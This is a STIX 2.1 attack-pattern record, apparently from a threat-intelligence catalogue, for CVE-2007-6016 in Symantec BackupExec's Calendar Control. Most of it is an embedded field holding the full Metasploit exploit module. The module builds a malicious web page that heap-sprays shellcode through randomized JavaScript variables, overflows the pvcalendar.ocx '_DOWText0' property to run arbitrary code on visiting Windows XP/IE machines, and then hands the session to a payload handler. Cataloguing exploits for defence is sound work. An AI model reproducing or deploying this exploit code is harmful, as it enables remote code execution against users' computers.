{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3535fec6-3b23-400a-9593-41b132f260b0",
    "created": "2024-08-14T16:40:38.612553Z",
    "modified": "2024-08-14T16:40:38.612558Z",
    "name": "Symantec BackupExec Calendar Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Symantec BackupExec Calendar Control. By sending an overly long string to the \"_DOWText0\" property located in the pvcalendar.ocx control, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/symantec_backupexec_pvcalendar.rb",
            "external_id": "symantec_backupexec_pvcalendar.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-6016"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20080302192347/http://secunia.com:80/advisories/27885/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec BackupExec Calendar Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Symantec BackupExec Calendar Control.\n        By sending an overly long string to the \"_DOWText0\" property located\n        in the pvcalendar.ocx control, an attacker may be able to execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Elazar Broad <elazarb[at]earthlink.net>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-6016' ],\n          [ 'OSVDB', '42358'],\n          [ 'BID', '26904' ],\n          [ 'URL', 'http://web.archive.org/web/20080302192347/http://secunia.com:80/advisories/27885/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP2 / IE 6.0 SP0-2 & IE 7.0 English', { 'Offset' => 256, 'Ret' => 0x0A0A0A0A } ]\n        ],\n      'DisclosureDate' => '2008-02-28',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape(make_nops(4))\n    ret  \t  = Rex::Text.uri_encode([target.ret].pack('L'))\n    blocksize = 0x30000\n    fillto    = 400\n    offset \t  = target['Offset']\n    junk\t  = rand_text_alpha(4)\n\n    # Randomize the javascript variable names\n    pvcalendar   = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_junk       = rand_text_alpha(rand(100) + 1)\n    j_filename   = rand_text_alpha(rand(16) + 1)\n    randnop      = rand_text_alpha(rand(100) + 1)\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:22ACD16F-99EB-11D2-9BB3-00400561D975' id='#{pvcalendar}'></object>\n<script language='javascript'>\n#{j_shellcode} = unescape('#{shellcode}');\n#{randnop} = \"#{nops}\";\n#{j_nops} = unescape(#{randnop});\n#{j_headersize} = 20;\n#{j_slackspace} = #{j_headersize} + #{j_shellcode}.length\nwhile (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};\n#{j_fillblock} = #{j_nops}.substring(0, #{j_slackspace});\n#{j_block} = #{j_nops}.substring(0, #{j_nops}.length - #{j_slackspace});\nwhile(#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};\n#{j_memory} = new Array();\nfor (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};\n#{j_ret} = unescape('#{ret}');\nwhile (#{j_ret}.length < #{offset}) #{j_ret} += #{j_ret};\n#{j_junk} = '#{junk}';\nwhile (#{j_junk}.length < #{offset}) #{j_junk} += #{j_junk};\ntry {\n#{pvcalendar}._DOWText0 = #{j_junk} + #{j_ret};\n#{pvcalendar}.Save('#{j_filename}',0);\n} catch(err) {}\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-02-28",
    "x_mitre_platforms": [
        "win'"
    ]
}